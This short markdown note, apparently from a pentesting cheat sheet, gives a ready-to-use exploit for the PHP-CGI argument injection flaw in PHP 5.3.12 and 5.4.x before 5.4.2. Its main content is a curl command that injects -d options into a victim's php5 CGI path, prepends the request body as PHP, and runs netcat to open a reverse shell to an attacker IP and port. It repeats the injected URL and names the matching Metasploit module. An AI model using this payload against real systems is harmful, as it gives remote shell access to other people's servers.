## Versions affected
	5.3.12 and 5.4.x < 5.4.2 

## Exploit
5.3.12 and 5.4.x < 5.4.2 PHP-CGI or PHP5-CGI

	curl -i -s -k -X 'POST' --data-binary "<?php system(\"nc [attacker ip] [port] -e /bin/sh\"); die; ?> "http://[victim ip]/cgi-bin/php5?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"

The following should be url encoded.

	"http://[victim ip]/cgi-bin/php5?-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n"

## Meterpreter
	search php_cgi_args_injection